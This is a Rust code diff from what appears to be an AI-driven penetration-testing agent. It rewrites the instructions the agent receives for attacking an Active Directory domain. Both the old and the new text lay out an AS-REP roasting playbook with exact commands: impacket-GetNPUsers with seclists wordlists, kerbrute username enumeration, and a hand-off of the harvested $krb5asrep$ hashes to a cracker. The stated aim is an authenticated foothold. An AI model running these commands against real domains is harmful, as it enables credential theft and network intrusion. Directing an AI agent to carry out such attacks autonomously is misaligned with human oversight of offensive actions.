@@ -135,38 +135,56 @@ pub(crate) fn build_asrep_payload(
     if !known_users.is_empty() {
         payload["known_users"] = json!(known_users);
         payload["instructions"] = json!(format!(
-            "{} usernames already discovered for {}. Run \
-             `impacket-GetNPUsers -no-pass -dc-ip {} {}/ -usersfile <(echo \
-             \"$known_users\")` and harvest any $krb5asrep$ hashes; \
-             prioritise this over `kerberos_user_enum_noauth` (some \
-             DCs deny anonymous SAMR). Hand any roastable hash to the \
-             cracker tool immediately.",
-            known_users.len(),
-            domain,
-            dc_ip,
-            domain,
+            "{user_count} usernames already discovered for {dom}. \
+             MANDATORY FIRST ACTION: call tool `asrep_roast` with args \
+             `domain={dom}`, `dc_ip={ip}`, `known_users=<the \
+             known_users array from this payload>`. The tool wraps \
+             `impacket-GetNPUsers -no-pass -dc-ip {ip} {dom}/ -usersfile <list>` \
+             and emits $krb5asrep$ hashes for every account with \
+             pre-auth disabled. Do this BEFORE any password_spray or \
+             username_as_password attempts — AS-REP roast yields \
+             crackable hashes with zero credentials and is the highest \
+             EV move whenever ≥1 username is known. After asrep_roast, \
+             hand any hashes to the cracker tool immediately. Only fall \
+             back to `kerberos_user_enum_noauth` if asrep_roast itself \
+             errors (some DCs deny anonymous SAMR — that does NOT block \
+             asrep_roast, which talks to KDC directly).",
+            user_count = known_users.len(),
+            dom = domain,
+            ip = dc_ip,
         ));
     } else {
         payload["instructions"] = json!(format!(
             "No usernames discovered yet for {dom}. Cold-start AS-REP \
-             enumeration plan: \
-             (1) `impacket-GetNPUsers -no-pass -dc-ip {ip} {dom}/ \
-             -usersfile /usr/share/seclists/Usernames/Names/names.txt \
-             -format hashcat` (zero-cred; returns $krb5asrep$ for any \
-             preauth-disabled account). \
-             (2) If step 1 returns no hashes, also try \
-             `/usr/share/seclists/Usernames/top-usernames-shortlist.txt` \
-             and `/usr/share/seclists/Usernames/cirt-default-usernames.txt`. \
-             (3) For username enumeration via Kerberos error codes \
-             (KDC_ERR_C_PRINCIPAL_UNKNOWN vs KDC_ERR_PREAUTH_REQUIRED), \
-             run `kerbrute userenum --dc {ip} -d {dom} \
-             /usr/share/seclists/Usernames/Names/names.txt` if \
-             available. \
+             enumeration plan — execute in this exact order: \
+             (1) MANDATORY FIRST ACTION: call tool `asrep_roast` with \
+             args `domain={dom}`, `dc_ip={ip}`, and \
+             `users_file=/usr/share/seclists/Usernames/Names/names.txt`. \
+             This wraps `impacket-GetNPUsers -no-pass -dc-ip {ip} {dom}/ \
+             -usersfile <wordlist> -format hashcat` and returns \
+             $krb5asrep$ hashes for any preauth-disabled account — \
+             zero credentials required. Run this BEFORE any \
+             password_spray or username_as_password attempt; AS-REP \
+             roast is the highest-EV move on a cold target and almost \
+             always returns at least one crackable hash on default lab \
+             builds (GOAD, BadBlood, vagrant defaults). \
+             (2) If step 1 returns no hashes, call `asrep_roast` again \
+             with `users_file=/usr/share/seclists/Usernames/top-usernames-shortlist.txt` \
+             then with `/usr/share/seclists/Usernames/cirt-default-usernames.txt`. \
+             (3) Only after every wordlist is exhausted in step 1+2, \
+             call `kerberos_user_enum_noauth` to enumerate users via \
+             Kerberos error codes (KDC_ERR_C_PRINCIPAL_UNKNOWN vs \
+             KDC_ERR_PREAUTH_REQUIRED), then re-run `asrep_roast` with \
+             the discovered names. \
              (4) Hand every $krb5asrep$ hash to the cracker tool \
-             immediately — even one cracked AS-REP hash unlocks an \
+             immediately — one cracked AS-REP hash unlocks an \
              authenticated foothold in {dom}. \
-             Do NOT fall back to anonymous SAMR if it returns \
-             ACCESS_DENIED; that path is dead on hardened DCs.",
+             Do NOT skip directly to `password_spray` or \
+             `username_as_password` — those are LOW EV without known \
+             passwords and will burn the dispatch budget with zero \
+             yield. Do NOT fall back to anonymous SAMR (rpcclient \
+             enumdomusers) on ACCESS_DENIED; hardened DCs block that \
+             path and it is unrelated to asrep_roast viability.",
             dom = domain,
             ip = dc_ip,
         ));
